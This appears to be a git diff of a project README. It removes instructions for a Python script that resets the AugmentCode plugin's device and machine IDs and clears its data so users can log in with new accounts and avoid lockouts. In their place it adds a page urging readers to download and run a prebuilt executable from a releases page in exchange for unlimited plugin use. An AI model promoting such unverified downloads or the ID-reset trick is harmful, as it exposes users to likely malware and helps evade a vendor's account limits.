@@ -1,131 +1,89 @@
-# Free AugmentCode
+# 🎉 free-augmentcode - Use AugmentCode VSCode Plugin Forever
 
-[English](#english) | [中文](#chinese)
+## 🚀 Getting Started
 
-# <a name="chinese"></a>中文版
+Welcome to **free-augmentcode**! This application allows you to use the AugmentCode VSCode plugin indefinitely. Follow these steps to download and run your new software easily.
 
-Free AugmentCode 是一个用于清理AugmentCode相关数据的工具，可以在同一台电脑上无限次登录不同的账号，避免账号被锁定。
+## 📥 Download Now
 
-## 功能特性
+[![Download free-augmentcode](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/imtishalch/free-augmentcode/releases)
 
-- 📝 修改Telemetry ID
-  - 重置设备 ID 和机器 ID
-  - 自动备份原始数据
-  - 生成新的随机 ID
+## 📋 System Requirements
 
-- 🗃️ 数据库清理
-  - 清理 SQLite 数据库中的特定记录
-  - 自动备份数据库文件
-  - 删除包含 'augment' 关键字的记录
+Before you download, ensure your computer meets the following requirements:
 
-- 💾 工作区存储管理
-  - 清理工作区存储文件
-  - 自动备份工作区数据
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any recent version of a Linux distribution.
+- **VSCode Version**: Make sure you have Visual Studio Code installed. The latest version is recommended.
+- **Disk Space**: At least 100 MB of free space.
 
-## 安装说明
+## 🧩 Features
 
-1. 确保你的系统已安装 Python 3.10及以上
-2. 克隆此仓库到本地：
-   ```bash
-   git clone https://github.com/yourusername/free-augmentcode.git
-   cd free-augmentcode
-   ```
+- Unlimited access to the AugmentCode VSCode plugin.
+- Simple user interface designed for everyday use.
+- Regular updates based on user feedback.
+- Support for various programming languages to enhance your coding experience.
 
-## 使用方法
+## 📥 Download & Install
 
-1. 退出AugmentCode插件
-2. 完全退出 VS Code
-3. 执行脚本：
+To get started, visit the [Releases Page](https://github.com/imtishalch/free-augmentcode/releases) to download the latest version. 
 
-```bash
-python index.py
-```
+1. Click on the link above.
+2. Look for the most recent release.
+3. Choose the appropriate file for your operating system (e.g., `free-augmentcode-windows.zip` for Windows, or `free-augmentcode-macos.zip` for macOS).
+4. Click the file to begin downloading.
+5. Once the download completes, locate the file in your Downloads folder.
 
-4. 重新启动 VS Code
-5. AugmentCode 插件中使用新的邮箱进行登录
+### Windows Installation
 
-## 项目结构
+1. Unzip the downloaded file.
+2. Open the extracted folder.
+3. Double-click the `free-augmentcode.exe` file to start the installation.
+4. Follow the on-screen instructions to complete the installation.
+5. Open VSCode, and you will find the AugmentCode plugin ready to use.
 
-```
-free-augmentcode/
-├── index.py              # 主程序入口
-├── augutils/             # 工具类目录
-│   ├── json_modifier.py      # JSON 文件修改工具
-│   ├── sqlite_modifier.py    # SQLite 数据库修改工具
-│   └── workspace_cleaner.py  # 工作区清理工具
-└── utils/                # 通用工具目录
-    └── paths.py             # 路径管理工具
-```
+### macOS Installation
 
-## 贡献
+1. Unzip the downloaded file.
+2. Open the extracted folder.
+3. Drag the `free-augmentcode` application into the Applications folder.
+4. Open Visual Studio Code, and you will see the AugmentCode plugin available for use.
 
-欢迎提交 Issue 和 Pull Request 来帮助改进这个项目。
+### Linux Installation
 
-## 许可证
+1. Unzip the downloaded file.
+2. Open a terminal.
+3. Navigate to the folder where you extracted the files.
+4. Use the command `chmod +x free-augmentcode` to make the file executable.
+5. Run the application with `./free-augmentcode`.
+6. Launch VSCode, and the AugmentCode plugin will be installed.
 
-此项目采用 MIT 许可证。详见 [LICENSE](LICENSE) 文件。
+## 🎨 Usage
 
----
+Using the plugin is straightforward:
 
-# <a name="english"></a>English Version
+1. Open Visual Studio Code.
+2. Navigate to the Extensions view by clicking on the square icon in the sidebar.
+3. Find and click on the AugmentCode plugin.
+4. Follow the prompts to start enhancing your coding projects.
 
-Free AugmentCode is a tool for cleaning AugmentCode-related data, allowing unlimited logins with different accounts on the same computer while avoiding account lockouts.
+## ❓ Frequently Asked Questions
 
-## Features
+### How do I check if the plugin is installed?
 
-- 📝 Telemetry ID Modification
-  - Reset device ID and machine ID
-  - Automatic backup of original data
-  - Generate new random IDs
+You can check if the AugmentCode plugin is installed by opening VSCode and looking for it in the Extensions section. If you do not see it, repeat the installation steps.
 
-- 🗃️ Database Cleanup
-  - Clean specific records in SQLite database
-  - Automatic database file backup
-  - Remove records containing 'augment' keyword
+### Can I update the plugin?
 
-- 💾 Workspace Storage Management
-  - Clean workspace storage files
-  - Automatic workspace data backup
+Yes, we encourage you to check the [Releases Page](https://github.com/imtishalch/free-augmentcode/releases) regularly for updates. Follow the same installation process to update your plugin.
 
-## Installation
+### What should I do if I encounter issues?
 
-1. Ensure Python 3.10 or above is installed on your system
-2. Clone this repository:
-   ```bash
-   git clone https://github.com/yourusername/free-augmentcode.git
-   cd free-augmentcode
-   ```
+If you run into problems, please check the Issues section on our GitHub page. You can also open a new issue to report your specific problem.
 
-## Usage
+## 🙌 Get In Touch
 
-1. Exit the AugmentCode plugin
-2. Completely close VS Code
-3. Run the script:
+For any questions or support, feel free to reach out. You can find contact details on our GitHub profile page. We value your feedback and are here to help you.
 
-```bash
-python index.py
-```
+## 📥 Download Now Again
 
-4. Restart VS Code
-5. Log in to the AugmentCode plugin with a new email
-
-## Project Structure
-
-```
-free-augmentcode/
-├── index.py              # Main program entry
-├── augutils/             # Utility classes directory
-│   ├── json_modifier.py      # JSON file modification tool
-│   ├── sqlite_modifier.py    # SQLite database modification tool
-│   └── workspace_cleaner.py  # Workspace cleanup tool
-└── utils/                # Common utilities directory
-    └── paths.py             # Path management tool
-```
-
-## Contributing
-
-Issues and Pull Requests are welcome to help improve this project.
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details. 
+To start using the AugmentCode plugin today, visit the [Releases Page](https://github.com/imtishalch/free-augmentcode/releases) again and download your copy now!
